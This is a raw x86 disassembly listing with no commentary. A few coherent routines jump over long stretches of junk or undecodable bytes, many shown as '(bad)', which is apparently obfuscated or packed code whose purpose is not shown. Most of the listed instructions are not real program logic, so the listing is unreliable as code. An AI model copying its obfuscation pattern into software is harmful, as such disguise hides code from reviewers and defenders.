  40fd1b:	mov    esi,0xb122a8a9
  40fd20:	push   ebx
  40fd21:	jbe    0x40fd92
  40fd23:	xchg   edx,eax
  40fd24:	xchg   esp,eax
  40fd25:	jmp    0x65f3:0x5973b435
  40fd2c:	sbb    DWORD PTR [esi],edx
  40fd2e:	cmp    DWORD PTR [edx+eiz*8-0x3c32d121],edi
  40fd35:	call   0x3337:0xbd252fbd
  40fd3c:	mov    ecx,0x7834d719
  40fd41:	mov    edx,0x8740f137
  40fd46:	jns    0x40fd7f
  40fd48:	mov    cl,0xdd
  40fd4a:	add    BYTE PTR [eax-0x20fb4d0],cl
  40fd50:	push   edi
  40fd51:	pop    eax
  40fd52:	dec    BYTE PTR [esi+0x70]
  40fd55:	in     eax,dx
  40fd56:	add    dl,dl
  40fd58:	in     eax,0x6a
  40fd5a:	mov    edx,0xdd9c3b03
  40fd5f:	mov    BYTE PTR [ebp-0x3d],bl
  40fd62:	into   
  40fd63:	and    eax,0x723b4545
  40fd68:	or     BYTE PTR [ebp+0x8],al
  40fd6b:	mov    edx,0x2b73401c
  40fd70:	inc    eax
  40fd71:	jmp    0x40fda7
  40fd73:	jmp    FWORD PTR [esi+eax*4]
  40fd76:	jbe    0x40fd1b
  40fd78:	and    dl,BYTE PTR [ebp-0xfe4b719]
  40fd7e:	mov    DWORD PTR [ecx-0x7f33d597],ebx
  40fd84:	inc    edx
  40fd85:	add    BYTE PTR [edx-0x2271ab55],cl
  40fd8b:	das    
  40fd8c:	(bad)  
  40fd8e:	(bad)  
  40fd8f:	mov    cl,0xee
  40fd91:	inc    esp
  40fd92:	shl    eax,0x78
  40fd95:	lea    esp,[edx]
  40fd97:	data16 or ah,BYTE PTR fs:[ebp-0x72]
  40fd9c:	imul   ebx,DWORD PTR [edx+eax*4+0x37ba78f],0x69
  40fda4:	clc    
  40fda5:	rcr    DWORD PTR ds:0xea09b90a,0x84
  40fdac:	and    DWORD PTR ds:0x5235b1dd,esi
  40fdb2:	retf   
  40fdb3:	push   ebp
  40fdb4:	push   0xffffffaf
  40fdb6:	mov    ds:0xb2beaefe,eax
  40fdbb:	push   ebx
  40fdbc:	push   esp
  40fdbd:	sub    eax,0x1353d214
  40fdc2:	xor    al,0xbc
  40fdc4:	(bad)  
  40fdc5:	(bad)  
  40fdc6:	fmul   st(4),st
  40fdc8:	outs   dx,BYTE PTR ds:[esi]
  40fdc9:	js     0x40fe1e
  40fdcb:	mov    ebx,DWORD PTR [edi+0x5c255f90]
  40fdd1:	repz rol DWORD PTR [esp+ebp*1+0x6f],1
  40fdd6:	adc    ah,ah
  40fdd8:	and    esp,DWORD PTR [ecx+0x36]
  40fddb:	pop    edi
  40fddc:	lahf   
  40fddd:	jecxz  0x40fd99
  40fddf:	(bad)  
  40fde0:	les    edx,FWORD PTR [ebp-0x428c395a]
  40fde6:	cmp    al,BYTE PTR [ebx+0x71889ec9]
  40fdec:	sbb    eax,0xb7b2e954
  40fdf1:	outs   dx,DWORD PTR ds:[esi]
  40fdf2:	pop    edi
  40fdf3:	add    eax,0x9c6ee4ca
  40fdf8:	xor    BYTE PTR [edi],ah
  40fdfa:	adc    ebx,DWORD PTR [ebx+0x54a3d873]
  40fe00:	popf   
  40fe01:	xchg   edi,eax
  40fe02:	test   BYTE PTR [ebp-0x3a4d7b4],ah
  40fe08:	adc    eax,0x2e302b5c
  40fe0d:	push   ds
  40fe0e:	sti    
  40fe0f:	bound  ecx,QWORD PTR [ebx+0x7d]
  40fe12:	mov    eax,0x1a8a415
  40fe17:	imul   edi,DWORD PTR [edx],0x2264eaaf
  40fe1d:	mov    ecx,0x56d47f5a
  40fe22:	in     al,0x2f
  40fe24:	ds adc al,0x6
  40fe27:	xor    ecx,0x328a
  40fe2d:	push   ecx
  40fe2e:	xor    eax,0x6fbd
  40fe33:	push   eax
  40fe34:	push   esi
  40fe35:	push   edx
  40fe36:	call   0x421ba4
  40fe3b:	mov    ecx,DWORD PTR [ebp-0x38]
  40fe3e:	mov    esi,DWORD PTR [ebp-0x34]
  40fe41:	xor    ecx,eax
  40fe43:	mov    eax,DWORD PTR [ebp-0x30]
  40fe46:	xor    esi,edx
  40fe48:	mov    edx,DWORD PTR [ebp-0x2c]
  40fe4b:	xor    ecx,0x5c4cdac
  40fe51:	xor    esi,0x1d15d2ad
  40fe57:	add    ecx,eax
  40fe59:	mov    eax,DWORD PTR [ebp+0x8]
  40fe5c:	adc    esi,edx
  40fe5e:	pop    edi
  40fe5f:	mov    DWORD PTR [eax],ecx
  40fe61:	mov    DWORD PTR [eax+0x4],esi
  40fe64:	pop    esi
  40fe65:	pop    ebx
  40fe66:	leave  
  40fe67:	ret    0x8
  40fe6a:	push   ebp
  40fe6b:	mov    ebp,esp
  40fe6d:	sub    esp,0x28
  40fe70:	mov    DWORD PTR [ebp-0x14],0x4ccf
  40fe77:	mov    DWORD PTR [ebp-0x10],0x348b
  40fe7e:	mov    DWORD PTR [ebp-0xc],0x5e14
  40fe85:	mov    DWORD PTR [ebp-0x8],0x2e13
  40fe8c:	mov    DWORD PTR [ebp-0x4],0x4295
  40fe93:	mov    DWORD PTR [ebp-0x1c],0x7f2c
  40fe9a:	jmp    0x4100d3
  40fe9f:	es push es
  40fea1:	jecxz  0x40fe98
  40fea3:	jecxz  0x40feda
  40fea5:	cmp    eax,0x25a6be1d
  40feaa:	xor    DWORD PTR [eax],ebp
  40feac:	mov    ds:0x2ba8712f,al
  40feb1:	mov    ebx,0xbbbfebbb
  40feb6:	mov    ebx,0x3b9d4ab0
  40febb:	aaa    
  40febc:	sbb    DWORD PTR [eax+ebx*2+0x58],edi
  40fec0:	mov    ch,0x82
  40fec2:	cmp    dh,BYTE PTR [edi]
  40fec4:	push   ds
  40fec5:	dec    ecx
  40fec6:	out    0xe1,eax
  40fec8:	out    0x59,eax
  40feca:	jmp    0x372f8fee
  40fecf:	dec    edx
  40fed0:	mov    bh,0x25
  40fed2:	lods   eax,DWORD PTR ds:[esi]
  40fed3:	fstp   TBYTE PTR [esp+ecx*8]
  40fed6:	std    
  40fed7:	xor    al,0x99
  40fed9:	je     0x40fe78
  40fedb:	hlt    
  40fedc:	jne    0x40ff0f
  40fede:	dec    ebp
  40fedf:	scas   eax,DWORD PTR es:[edi]
  40fee0:	xor    ah,BYTE PTR [eax+0x35]
  40fee3:	dec    ecx
  40fee4:	(bad)  
  40fee5:	adc    DWORD PTR [esp+ebp*8+0x1c],esp
  40fee9:	shl    ecx,cl
  40feeb:	push   ds
  40feec:	jne    0x40ff23
  40feee:	mov    cl,0x2a
  40fef0:	cwde   
  40fef1:	mov    bl,0xff
  40fef3:	sbb    dl,BYTE PTR ds:0x18e77ff7
  40fef9:	clc    
  40fefa:	adc    ebx,DWORD PTR [edi+0x3c]
  40fefd:	cwde   
  40fefe:	clc    
  40feff:	out    0x48,al
  40ff01:	and    esi,ecx
  40ff03:	xlat   BYTE PTR ds:[ebx]
  40ff04:	add    BYTE PTR [ebx+0x6727e94c],bl
  40ff0a:	dec    edx
  40ff0b:	push   ebp
  40ff0c:	jbe    0x40feb3
  40ff0e:	mov    ds:0xeb1482c2,al
  40ff13:	push   ebp
  40ff14:	dec    ebp
  40ff15:	ja     0x40ff37
  40ff17:	inc    esp
  40ff18:	xlat   BYTE PTR ds:[ebx]
  40ff19:	fld    QWORD PTR [ecx+eax*2]
  40ff1c:	fiadd  DWORD PTR [edx]
  40ff1e:	shl    DWORD PTR [ebx],cl
  40ff20:	dec    edi
  40ff21:	inc    edx
  40ff22:	dec    edx
  40ff23:	out    0x47,al
  40ff25:	aaa    
  40ff26:	push   ebx
  40ff27:	push   0x21
  40ff29:	push   di
  40ff2b:	mov    ch,0x76
  40ff2d:	sbb    esp,DWORD PTR [ecx-0x1b]
  40ff30:	sub    al,0xce
  40ff32:	outs   dx,BYTE PTR ds:[esi]
  40ff33:	cld    
  40ff34:	push   edi
  40ff35:	(bad)  
  40ff37:	data16 jnp 0x40ff3e
  40ff3a:	rcl    dh,0x0
  40ff3d:	adc    dh,ch
  40ff3f:	lods   al,BYTE PTR ds:[esi]
  40ff40:	add    eax,0x8a9f19f3
  40ff45:	mov    dl,0xeb
  40ff47:	mov    al,0xa5
  40ff49:	nop
  40ff4a:	pusha  
  40ff4b:	iret   
  40ff4c:	push   ebx
  40ff4d:	stos   BYTE PTR es:[edi],al
  40ff4e:	cmp    BYTE PTR [eax-0x56541f3d],ch
  40ff54:	cli    
  40ff55:	mov    BYTE PTR [edx],0xb4
  40ff58:	jnp    0x40ff67
  40ff5a:	scas   al,BYTE PTR es:[edi]
  40ff5b:	sub    eax,DWORD PTR [esi-0xa]
  40ff5e:	test   DWORD PTR [ecx+0x15],0x9bd7c4e7
  40ff65:	fcmovu st,st(6)
  40ff67:	loopne 0x40ffae
  40ff69:	xchg   ecx,esi
  40ff6b:	aam    0x32
  40ff6d:	fistp  QWORD PTR [ecx+0x7a]
  40ff70:	stc    
  40ff71:	sub    dh,BYTE PTR [edi+0x36]
  40ff74:	dec    ebx
  40ff75:	sahf   
  40ff76:	js     0x40ffa3
  40ff78:	lds    esi,FWORD PTR [eax+0x1e]
  40ff7b:	mov    bl,ah
  40ff7d:	jl     0x40ff51
  40ff7f:	cmp    ebp,esp
  40ff81:	stc    
  40ff82:	mov    ds:0x842ace3e,al
  40ff87:	mov    ebp,0x5b19802b
  40ff8c:	pop    ds
  40ff8d:	aaa    
  40ff8e:	repz or cl,BYTE PTR [ebp+0x67]
  40ff92:	or     eax,DWORD PTR [esi+0x66]
  40ff95:	xchg   DWORD PTR [edx],ecx
  40ff97:	in     eax,0xef
  40ff99:	push   cs
  40ff9a:	add    edi,eax
  40ff9c:	mov    al,0xf9
  40ff9e:	test   BYTE PTR [eax-0x1d213861],bh
  40ffa4:	adc    bh,BYTE PTR [ecx+0x1f]
  40ffa7:	and    al,0xa5
  40ffa9:	mov    ds:0x73ac7f02,eax
  40ffae:	dec    edi
  40ffaf:	inc    ebx
  40ffb0:	pop    ebx
  40ffb1:	les    ebp,FWORD PTR [ebp+0x2eb62161]
  40ffb7:	push   ebx
  40ffb8:	mov    ecx,0x97e504ed
  40ffbd:	jg     0x40ffc3
  40ffbf:	iret   
  40ffc0:	ss xchg ebp,eax
  40ffc2:	in     al,0xe6
  40ffc4:	xor    DWORD PTR [eax-0x79],esp
  40ffc7:	xchg   BYTE PTR ds:0x91cd5bbc,dl
  40ffcd:	jmp    DWORD PTR [ecx-0x1b396f28]
  40ffd3:	cmp    ah,BYTE PTR [ebp+0x4baa7b72]
  40ffd9:	out    0xdb,eax
  40ffdb:	popf   
  40ffdc:	and    al,0xca
  40ffde:	lahf   
  40ffdf:	imul   eax,DWORD PTR [eax],0xc8d84d6b
  40ffe5:	repnz push ss
  40ffe7:	mov    DWORD PTR [ecx+0x134ba665],0xc3e5b3c8
  40fff1:	xor    DWORD PTR [ebp-0x57788090],edi
  40fff7:	add    BYTE PTR [edi+0x5f],cl
  40fffa:	push   ds
  40fffb:	aas    
  40fffc:	push   ebx
  40fffd:	test   esp,ebx
  40ffff:	mov    ecx,0x264f3a47
  410004:	(bad)  
  410005:	and    BYTE PTR ds:0x69b55e93,dh
  41000b:	inc    esp
  41000c:	dec    ecx
  41000d:	fisttp WORD PTR [esi+0x7bdd1e09]
  410013:	xor    al,0x75
  410015:	inc    edi
  410016:	pop    eax
  410017:	mov    ds:0x82736f53,eax
  41001c:	mov    ch,0x63
  41001e:	mov    cl,BYTE PTR [eax]
  410020:	cwde   
  410021:	xor    ch,BYTE PTR [esi-0x4ef1b899]
  410027:	jno    0x410042
  410029:	enter  0xaa26,0xf3
  41002d:	in     al,dx
  41002e:	out    0xfc,eax
  410030:	pop    ebp
  410031:	(bad)
  410035:	in     al,dx
  410036:	leave  
  410037:	arpl   WORD PTR [eax],ax
  410039:	jne    0x41007a
  41003b:	jb     0x410002
  41003d:	xchg   esi,eax
  41003e:	scas   al,BYTE PTR es:[edi]
  41003f:	cli    
  410040:	ror    bh,cl
  410042:	adc    edx,ecx
  410044:	dec    ebp
  410045:	jbe    0x410039
  410047:	pop    ss
  410048:	fs inc edx
  41004a:	mov    dl,0x27
  41004c:	cmp    esi,eax
  41004e:	dec    eax
  41004f:	mov    edx,DWORD PTR ds:0x4f1c1fed
  410055:	ret    
  410056:	mov    ebx,DWORD PTR [esi-0x4ad63a9b]
  41005c:	ret    
  41005d:	push   ds
  41005e:	cmp    edi,DWORD PTR [esi-0x6b800fa1]
  410064:	ja     0x41001a
  410066:	mov    ecx,0xd3dd5889
  41006b:	xchg   BYTE PTR [esi+0x5c],ch
  41006e:	mov    eax,0x86aa6d3c
  410073:	popa   
  410074:	std    
  410075:	pop    esp
  410076:	add    DWORD PTR ds:0x98bf093f,ecx
  41007c:	pop    ebx
  41007d:	inc    ebp
  41007e:	je     0x41002e
  410080:	stos   DWORD PTR es:[edi],eax
  410081:	inc    ecx
  410082:	push   eax
  410083:	push   0x66a32caa
  410088:	xchg   edx,eax
  410089:	inc    ebx
  41008a:	(bad)  
  41008b:	mov    bh,0xe8
  41008d:	adc    eax,0x70dcadf6
  410093:	cwde   
  410094:	adc    cl,ah
  410096:	xchg   BYTE PTR [edi+ebx*8-0x6f],cl
  41009a:	div    DWORD PTR [eax+edx*8+0x398ba479]
  4100a1:	rol    dh,0x30
  4100a4:	and    dh,al
  4100a6:	xor    al,0x32
  4100a8:	xchg   ebp,eax
  4100a9:	not    DWORD PTR [esi]
  4100ab:	je     0x41006b
  4100ad:	cwde   
  4100ae:	leave  
  4100af:	les    edx,FWORD PTR [esp+ebp*1-0x192490da]
  4100b6:	retf   0xf8dc
  4100b9:	sub    esi,DWORD PTR [edi]
  4100bb:	fwait
  4100bc:	(bad)  
  4100bd:	pop    ecx
  4100be:	in     al,0x37
  4100c0:	xor    eax,DWORD PTR [ecx-0x2c3ebae4]
  4100c6:	retf   0x3c3d
  4100c9:	test   ecx,ebx
  4100cb:	hlt    
  4100cc:	xor    eax,0x986af0a9
  4100d1:	add    BYTE PTR [ecx-0x39],bh
  4100d4:	inc    ebp
  4100d5:	call   0x41155d
  4100da:	mov    DWORD PTR [ebp-0x28],0x3174
  4100e1:	mov    DWORD PTR [ebp-0x24],0x3bfa
  4100e8:	jmp    0x410321
  4100ed:	shl    cl,1
  4100ef:	sahf   
  4100f0:	aad    0x9e
  4100f2:	xchg   ebp,eax
  4100f3:	mov    cl,0xf5
  4100f5:	test   DWORD PTR [ecx+0x6fd43125],ebx
  4100fb:	test   DWORD PTR [ebx],edi
  4100fd:	fsubr  DWORD PTR [edi]
  4100ff:	mov    ebx,0xbbbfebbb
  410104:	mov    ebx,0x9d09fc0
  410109:	xchg   esi,eax
  41010a:	loop   0x410112
  41010c:	pop    eax
  41010d:	xchg   ebp,eax
  41010e:	imul   ebx,DWORD PTR [edx+edx*4+0x1],0xffffffe7
  410113:	leave  
  410114:	sbb    bl,al
  410116:	lds    ebx,FWORD PTR [ecx-0x33ad12dd]
  41011c:	inc    edi
  41011d:	inc    eax
  41011e:	cmc    
  41011f:	out    0x60,al
  410121:	jl     0x4100e8
  410123:	ror    BYTE PTR [ecx-0x752bafe0],1
  410129:	jecxz  0x41018f
  41012b:	pop    edi
  41012c:	or     eax,0x3a80ffca
  410131:	and    eax,0x245db486
  410136:	pop    DWORD PTR [esi+0x2985d4b3]
  41013c:	jns    0x4100c4
  41013e:	test   eax,0xb9324cc4
  410143:	cs or  eax,0xc079429e
  410149:	mov    eax,ds:0x96b08b56
  41014e:	je     0x4101ad
  410150:	add    BYTE PTR [esi+ecx*8+0x30],0x89
  410155:	scas   eax,DWORD PTR es:[edi]
  410156:	add    bh,BYTE PTR [eax+ecx*1]
  410159:	xor    ebp,ecx
  41015b:	stc    
  41015c:	and    DWORD PTR [edi+0x444f75bb],esi
  410162:	(bad)
  410165:	out    dx,eax
  410166:	imul   ecx,DWORD PTR [esi-0x326b00b4],0x2adaab0
  410170:	dec    esi
  410171:	mov    ah,0x70
  410173:	(bad)  
  410174:	dec    eax
  410175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410176:	(bad)  
  410178:	fisttp DWORD PTR [edx-0x38f1696d]
  41017e:	jmp    0xd8d3b1c8
  410183:	pushf  
  410184:	es and al,0x80
  410187:	xlat   BYTE PTR ds:[ebx]
  410188:	jg     0x41010a
  41018a:	and    cl,BYTE PTR [eax+0x3f]
  41018d:	push   edi
  41018e:	in     eax,dx
  41018f:	ins    DWORD PTR es:[edi],dx
  410190:	pusha  
  410191:	or     DWORD PTR [ecx+esi*2],0x7c
  410195:	or     esp,0xb5937e31
  41019b:	dec    eax
  41019c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41019d:	jge    0x4101c3
  41019f:	jl     0x410164
  4101a1:	int3   
  4101a2:	test   eax,0xcdc89230
  4101a7:	sub    DWORD PTR [esp+edx*1-0x779e48e4],edi
  4101ae:	push   esp
  4101af:	dec    ecx
  4101b0:	or     ebp,0xda8fe414
  4101b6:	xchg   ecx,eax
  4101b7:	neg    DWORD PTR ds:0x7101cfef
  4101bd:	shl    ch,0xb4
  4101c0:	xchg   bh,bh
  4101c2:	(bad)
  4101c5:	out    0x66,eax
  4101c7:	sbb    ebx,DWORD PTR [ebx+ebp*2]
  4101ca:	and    ah,BYTE PTR [edx+0x4a5943c8]
  4101d0:	(bad)  
  4101d1:	(bad)  
  4101d2:	mov    ch,0xfa
  4101d4:	rcl    BYTE PTR [ecx],cl
  4101d6:	and    al,0xe4
  4101d8:	repnz outs dx,DWORD PTR ds:[esi]
  4101da:	add    BYTE PTR [esi],dh
  4101dc:	push   cs
  4101dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101de:	sub    DWORD PTR [ecx],ecx
  4101e0:	push   ss
  4101e1:	sahf   
  4101e2:	dec    ebx
  4101e3:	stos   DWORD PTR es:[edi],eax
  4101e4:	jl     0x4101c5
  4101e6:	mov    DWORD PTR [ecx],esi
  4101e8:	cmp    BYTE PTR [ecx-0x264d5eb1],cl
  4101ee:	dec    edx
  4101ef:	jne    0x41023a
  4101f1:	pop    ebx
  4101f2:	or     eax,DWORD PTR [esi]
  4101f4:	sbb    eax,0xf5df0b81
  4101f9:	ror    BYTE PTR [esi+0x2465d1b0],cl
  4101ff:	push   ss
  410200:	jbe    0x410277
  410202:	js     0x410185
  410204:	jle    0x410205
  410206:	xchg   esp,eax
  410207:	arpl   cx,si
  410209:	sub    bh,BYTE PTR [eax+0x47e0a1a4]
  41020f:	xchg   BYTE PTR [edi+ebp*2-0x4f],dl
  410213:	cmp    eax,DWORD PTR [esi]
  410215:	adc    eax,0x7f247f7b
  41021a:	pushf  
  41021b:	retf   0xc045
  41021e:	and    BYTE PTR [ebp+0x1c9481b1],bh
  410224:	pop    ebp
  410225:	jmp    DWORD PTR [edx+0x54]
  410228:	push   esp
  410229:	int    0x21
  41022b:	gs jo  0x410294
  41022e:	ins    DWORD PTR es:[edi],dx
  41022f:	xchg   ebx,eax
  410230:	xor    ebp,DWORD PTR [ebx+eiz*8-0x143cbacf]
  410237:	ds ds jge 0x4101c0
  41023b:	adc    DWORD PTR [edi+0x5e],eax
  41023e:	cmp    BYTE PTR [edi],al
  410240:	dec    ecx
  410241:	push   ebx
  410242:	dec    cl
  410244:	jns    0x41029b
  410246:	out    0xd,al
  410248:	dec    esp
  410249:	sub    al,0x48
  41024b:	xor    DWORD PTR [esi-0x7238ef7f],0x508d0388
  410255:	sahf   
  410256:	(bad)  
  410257:	popf   
  410258:	mov    ds:0xf637f6ea,al
  41025d:	sahf   
  41025e:	push   eax
  41025f:	push   cs
  410260:	out    dx,eax
  410261:	xchg   edi,eax
  410262:	adc    eax,0x966e4d08
  410267:	into   
  410268:	leave  
  410269:	or     edi,DWORD PTR [ecx-0x21]
  41026c:	jmp    0xa457dbe3
  410271:	sahf   
  410272:	mov    edi,0xa6076fd9
  410277:	call   0x41860ad9
  41027c:	in     al,dx
  41027d:	stos   DWORD PTR es:[edi],eax
  41027e:	sbb    edi,DWORD PTR [eax+0x54]
  410281:	lds    di,DWORD PTR [edx+ecx*2]
  410285:	fadd   st,st(2)
  410287:	sub    edx,ebp
  410289:	aas    
  41028a:	shl    BYTE PTR [eax],1
  41028c:	les    esi,FWORD PTR [ebx]
  41028e:	pop    ecx
  41028f:	ror    esi,1
  410291:	sbb    eax,0x43b5723b
  410296:	xlat   BYTE PTR ds:[ebx]
  410297:	js     0x410283
  410299:	xchg   ebp,eax
  41029a:	inc    esp
  41029b:	jle    0x4102f0
  41029d:	inc    esi
  41029e:	push   esi
  41029f:	call   0xafe4:0x9a7e887c
  4102a6:	add    DWORD PTR [edx+0x2a59706c],0x53
  4102ad:	pushf  
  4102ae:	cwde   
  4102af:	adc    al,0x67
  4102b1:	and    ch,0x6
  4102b4:	sub    al,0x23
  4102b6:	imul   DWORD PTR [ebp+0x1f]
  4102b9:	inc    eax
  4102ba:	jne    0x41030e
  4102bc:	sahf   
  4102bd:	xor    ebx,DWORD PTR [eax+0x55]
  4102c0:	sub    al,bl
  4102c2:	dec    ecx
  4102c3:	dec    esi
  4102c4:	push   ss
  4102c5:	aam    0x36
  4102c7:	test   al,0xd1
  4102c9:	dec    ebp
  4102ca:	mov    ah,0x4d
  4102cc:	push   ds
  4102cd:	adc    eax,DWORD PTR [eax-0x243fff87]
  4102d3:	aaa    
  4102d4:	sbb    DWORD PTR [edi],esi
  4102d6:	outs   dx,DWORD PTR ds:[esi]
  4102d7:	mov    ah,0x82
  4102d9:	js     0x410288
  4102db:	test   al,0xfb
  4102dd:	and    bl,BYTE PTR [edi-0x519ff151]
  4102e3:	xchg   ebp,eax
  4102e4:	pop    esi
  4102e5:	xchg   ecx,eax
  4102e6:	mov    ecx,0xa9a2dc38
  4102eb:	stos   BYTE PTR es:[edi],al
  4102ec:	cmc    
  4102ed:	dec    edi
  4102ee:	push   ss
  4102ef:	(bad)  
  4102f0:	adc    cl,BYTE PTR [ecx+0x3]
  4102f3:	es repz js 0x4102b0
  4102f7:	in     al,0x4f
  4102f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102fa:	push   ebp
  4102fb:	sub    DWORD PTR [edx+0x6594045f],edi
  410301:	cwde   
  410302:	lock and DWORD PTR [edx+ebx*1],0x7e3f2950
  41030a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41030b:	ret    
  41030c:	int    0xd6
  41030e:	pushf  
  41030f:	outs   dx,DWORD PTR ds:[esi]
  410310:	sbb    eax,0xbaf7df4c
  410315:	xor    DWORD PTR [ebx+0x27c3a611],esp
  41031b:	sbb    esi,DWORD PTR [edi]
  41031d:	scas   eax,DWORD PTR es:[edi]
  41031e:	mov    ah,BYTE PTR [eax-0x1fba3819]
  410324:	add    BYTE PTR [ebx],0x0
  410327:	add    BYTE PTR [ebx+0x4224c40d],cl
  41032d:	add    BYTE PTR [ecx+0x4224c0],ah
  410333:	xor    edx,edx
  410335:	div    ecx
  410337:	mov    ecx,DWORD PTR ds:0x4224bc
  41033d:	xor    edx,edx
  41033f:	and    eax,0x7cfc
  410344:	div    ecx
  410346:	mov    ecx,DWORD PTR ds:0x4224b8
  41034c:	or     ecx,eax
  41034e:	jmp    0x410587
  410353:	arpl   WORD PTR [eax],bx
  410355:	push   es
  410356:	cmp    eax,0x9c793dbd
  41035b:	sbb    dh,dh
  41035d:	mov    bl,0x2f
  41035f:	out    0xe9,al
  410361:	in     al,dx
  410362:	outs   dx,DWORD PTR ds:[esi]
  410363:	or     DWORD PTR [ebx],esi
  410365:	mov    ebx,0xbbbfebbb
  41036a:	mov    ebx,0x536e57a9
  41036f:	test   al,0x6f
  410371:	adc    DWORD PTR [edi+0x39],edx
  410374:	(bad)  
  410375:	aam    0x8e
  410377:	aad    0xbd
  410379:	lods   al,BYTE PTR ds:[esi]
  41037a:	(bad)  
  41037b:	fild   DWORD PTR [edi]
  41037d:	icebp  
  41037e:	(bad)  
  41037f:	cmc    
  410380:	mov    eax,0x80a8467c
  410385:	mov    edx,0x5a72db06
  41038a:	cmp    ch,dl
  41038c:	mov    edi,0xe5a39803
  410391:	cli    
  410392:	inc    BYTE PTR [ebx]
  410394:	test   eax,0xd6252a31
  410399:	mov    ah,0x7a
  41039b:	(bad)  
  41039d:	sahf   
  41039e:	jge    0x410357
  4103a0:	gs inc ebx
  4103a2:	inc    esp
  4103a3:	mov    bp,0xda7a
  4103a7:	loope  0x41032a
  4103a9:	jb     0x4103d5
  4103ab:	and    DWORD PTR ds:0xe1e08597,esp
  4103b1:	inc    edi
  4103b2:	inc    esi
  4103b3:	out    0x98,eax
  4103b5:	fldl2e 
  4103b7:	dec    edi
  4103b8:	mov    edi,0x16700218
  4103bd:	push   ds
  4103be:	out    dx,al
  4103bf:	cmc    
  4103c0:	jmp    0x410384
  4103c2:	sub    ebp,eax
  4103c4:	test   ah,ah
  4103c6:	inc    ecx
  4103c7:	pop    ecx
  4103c8:	stos   BYTE PTR es:[edi],al
  4103c9:	(bad)  
  4103ca:	pop    eax
  4103cb:	mov    edx,es
  4103cd:	test   al,0x35
  4103cf:	out    dx,al
  4103d0:	repnz ss out dx,al
  4103d3:	jnp    0x4103bf
  4103d5:	xor    al,0x81
  4103d7:	push   eax
  4103d8:	push   0xffffffea
  4103da:	xor    eax,0x57a86d93
  4103df:	mov    al,ds:0xf691b4f0
  4103e4:	and    DWORD PTR [ecx+0x53],edi
  4103e7:	dec    ebp
  4103e8:	bound  ebx,QWORD PTR [edx+0x628a0cce]
  4103ee:	inc    ebp
  4103ef:	out    dx,al
  4103f0:	push   ebp
  4103f1:	sub    DWORD PTR [edi+edx*1+0x4b],edi
  4103f5:	jne    0x410398
  4103f7:	dec    ebx
  4103f8:	pusha  
  4103f9:	in     al,0xd5
  4103fb:	leave  
  4103fc:	pop    edi
  4103fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103fe:	or     al,0xf
  410400:	lock and al,0xbc
  410403:	das    
  410404:	mov    al,cl
  410406:	imul   DWORD PTR [ecx+0x78]
  410409:	cmp    eax,0x64d9e2a7
  41040e:	mov    ah,BYTE PTR [eax]
  410410:	mov    ds:0x6bb6e578,eax
  410415:	pop    ebx
  410416:	cmp    al,0xb7
  410418:	add    al,0x5d
  41041a:	xor    edi,DWORD PTR [esi+0x1a]
  41041d:	dec    esp
  41041e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41041f:	out    dx,al
  410420:	dec    esp
  410421:	jmp    0x8f04:0x180f3a79
  410428:	xchg   edi,eax
  410429:	aas    
  41042a:	and    DWORD PTR [ecx],esp
  41042c:	ins    DWORD PTR es:[edi],dx
  41042d:	pop    esp
  41042e:	fstp   DWORD PTR [ebx]
  410430:	jae    0x4103f3
  410432:	aam    0xf9
  410434:	(bad)
  410438:	scas   al,BYTE PTR es:[edi]
  410439:	test   BYTE PTR [ecx],bl
  41043b:	push   eax
  41043c:	xor    ah,bl
  41043e:	stos   DWORD PTR es:[edi],eax
  41043f:	sbb    DWORD PTR [eax+edi*1+0x12],0xb54320c
  410447:	inc    ecx
  410448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410449:	add    eax,0x5da8f7c7
  41044e:	mov    eax,0xf2bbc4e1
  410453:	aam    0x5
  410455:	and    dh,BYTE PTR [edi]
  410457:	int3   
  410458:	outs   dx,BYTE PTR ds:[esi]
  410459:	xor    al,0xe9
  41045b:	xchg   edi,eax
  41045c:	jmp    0x42b0:0x98b9ec8c
  410463:	jno    0x41042d
  410465:	xor    eax,0xd00d59a0
  41046a:	in     eax,0xb
  41046c:	ja     0x41048c
  41046e:	outs   dx,BYTE PTR ds:[esi]
  41046f:	mov    dh,0x6
  410471:	add    al,0x54
  410473:	mov    esi,0x9e184d54
  410478:	sahf   
  410479:	arpl   WORD PTR [ebp+0x2d],bp
  41047c:	retf   
  41047d:	cmp    eax,0xf3b7a30b
  410482:	jg     0x410501
  410484:	(bad)
  410488:	push   0x967d4cc1
  41048d:	sub    DWORD PTR [edx+esi*2+0x1b],edx
  410491:	or     eax,0x904c13f4
  410496:	pop    ecx
  410497:	retf   0x46bf
  41049a:	bound  eax,QWORD PTR [esi]
  41049c:	enter  0xbd83,0xf2
  4104a0:	push   ds
  4104a1:	stos   BYTE PTR es:[edi],al
  4104a2:	and    eax,0x547593d8
  4104a7:	xor    ecx,eax
  4104a9:	jge    0x410454
  4104ab:	aam    0x9
  4104ad:	push   es
  4104ae:	jae    0x41046e
  4104b0:	in     eax,dx
  4104b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104b2:	pop    esp
  4104b3:	mov    eax,DWORD PTR [ecx+edi*8+0x76]
  4104b7:	add    dl,dl
  4104b9:	pop    edi
  4104ba:	enter  0x2390,0x44
  4104be:	mov    eax,ds:0x114c761c
  4104c3:	cmp    ebx,DWORD PTR ds:0xc048ed7
  4104c9:	stos   DWORD PTR es:[edi],eax
  4104ca:	leave  
  4104cb:	out    dx,al
  4104cc:	mov    ebx,0x6336a3c8
  4104d1:	cwde   
  4104d2:	(bad)  
  4104d3:	enter  0xb3a9,0x8c
  4104d7:	xchg   ebp,eax
  4104d8:	push   eax
  4104d9:	and    bl,ah
  4104db:	(bad)  
  4104dc:	aad    0x30
  4104de:	xchg   ecx,eax
  4104df:	xchg   si,bx
  4104e2:	daa    
  4104e3:	push   ds
  4104e4:	or     al,0x46
  4104e6:	fadd   QWORD PTR [ecx+0x131e6bc3]
  4104ec:	retf   
  4104ed:	shl    ecx,1
  4104ef:	jp     0x41054b
  4104f1:	call   DWORD PTR [esi]
  4104f3:	clc    
  4104f4:	or     DWORD PTR [ebx-0x1278651b],0x4f
